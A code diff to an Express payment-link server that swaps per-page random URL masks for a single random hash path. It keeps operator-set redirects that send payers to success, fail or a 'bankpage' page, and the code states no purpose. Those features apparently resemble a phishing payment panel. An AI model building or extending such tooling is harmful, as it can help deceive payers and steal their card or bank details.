@@ -12,43 +12,23 @@ app.use(cors({
   methods: ['GET', 'POST']
 }));
 
-// Create URL masks for each HTML page
-// These constants will be used for URL generation
-const URL_MASKS = {
-  'landing.html': crypto.randomBytes(12).toString('hex'),
-  'payment.html': crypto.randomBytes(12).toString('hex'),
-  'success.html': crypto.randomBytes(12).toString('hex'),
-  'fail.html': crypto.randomBytes(12).toString('hex'),
-  'bankpage.html': crypto.randomBytes(12).toString('hex'),
-  'admin.html': 'admin' // Keep admin accessible normally
-};
+// Generate a random hash for the payments path
+const PAYMENT_HASH = crypto.randomBytes(16).toString('hex');
+console.log(`Payment URL hash: /${PAYMENT_HASH}`);
 
-// Reverse mapping for lookups
-const MASK_TO_PAGE = {};
-for (const [page, mask] of Object.entries(URL_MASKS)) {
-  MASK_TO_PAGE[mask] = page;
-}
-
-// Log the mappings for reference
-console.log('URL Masks:');
-for (const [page, mask] of Object.entries(URL_MASKS)) {
-  console.log(`${page} => /${mask}`);
-}
-
-// Set up masked routes
-Object.entries(URL_MASKS).forEach(([page, mask]) => {
-  app.get(`/${mask}`, (req, res) => {
-    // Keep the query parameters
-    const queryString = Object.entries(req.query)
-      .map(([key, value]) => `${key}=${value}`)
-      .join('&');
-    
-    // Redirect to the actual page but keep the masked URL in address bar
-    res.sendFile(path.join(process.cwd(), page));
-  });
+// Create a special route for masked landing page
+app.get(`/${PAYMENT_HASH}`, (req, res) => {
+  // Forward all query parameters to landing.html
+  const queryString = Object.entries(req.query)
+    .map(([key, value]) => `${key}=${encodeURIComponent(value)}`)
+    .join('&');
+  
+  // Redirect to the actual landing.html with all query parameters
+  // Use 302 to ensure browsers follow the redirect
+  res.redirect(`/landing.html${queryString ? '?' + queryString : ''}`);
 });
 
-// Serve static files as usual
+// Serve static files
 app.use(express.static("."));
 
 const PORT = process.env.PORT || 3000;
@@ -60,7 +40,7 @@ const io = new Server(server);
 const transactions = new Map();
 const paymentLinks = new Map();
 
-// Payment Links Endpoints - Update generatePaymentLink to use masks
+// Payment Links Endpoints - ONLY modify this function
 app.post('/api/generatePaymentLink', (req, res) => {
   try {
     const { amount, description } = req.body;
@@ -76,9 +56,8 @@ app.post('/api/generatePaymentLink', (req, res) => {
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     
-    // Use the mask instead of 'landing.html'
-    const landingMask = URL_MASKS['landing.html'];
-    const paymentLink = `${protocol}://${req.get('host')}/${landingMask}?pid=${invoiceId}`;
+    // Use the masked URL for payment link
+    const paymentLink = `${protocol}://${req.get('host')}/${PAYMENT_HASH}?pid=${invoiceId}`;
 
     paymentLinks.set(invoiceId, {
       amount: parseFloat(amount),
@@ -94,6 +73,7 @@ app.post('/api/generatePaymentLink', (req, res) => {
   }
 });
 
+// The rest of your code remains unchanged
 app.get('/api/getPaymentDetails', (req, res) => {
   const { pid } = req.query;
   if (!pid || !paymentLinks.has(pid)) {
@@ -180,11 +160,10 @@ app.get('/api/checkTransactionStatus', (req, res) => {
   }
 
   if (txn.redirectStatus) {
-    // Update URLs to use the masks
     const redirectUrls = {
-      success: `/${URL_MASKS['success.html']}?invoiceId=${invoiceId}`,
-      fail: `/${URL_MASKS['fail.html']}?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
-      bankpage: `/${URL_MASKS['bankpage.html']}?invoiceId=${invoiceId}`
+      success: `/success.html?invoiceId=${invoiceId}`,
+      fail: `/fail.html?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
+      bankpage: `/bankpage.html?invoiceId=${invoiceId}`
     };
     return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
   }
@@ -214,17 +193,16 @@ app.post('/api/updateRedirectStatus', (req, res) => {
     txn.failureReason = failureReason;
   }
 
-  // Update URLs to use the masks
   const redirectUrls = {
-    success: `/${URL_MASKS['success.html']}?invoiceId=${invoiceId}`,
-    fail: `/${URL_MASKS['fail.html']}?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
+    success: `/success.html?invoiceId=${invoiceId}`,
+    fail: `/fail.html?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
   };
 
   res.json({
     status: "success",
     invoiceId,
     redirectStatus,
-    redirectUrl: redirectUrls[redirectStatus] || `/${URL_MASKS['bankpage.html']}?invoiceId=${invoiceId}`
+    redirectUrl: redirectUrls[redirectStatus] || `/bankpage.html?invoiceId=${invoiceId}`
   });
 });
 
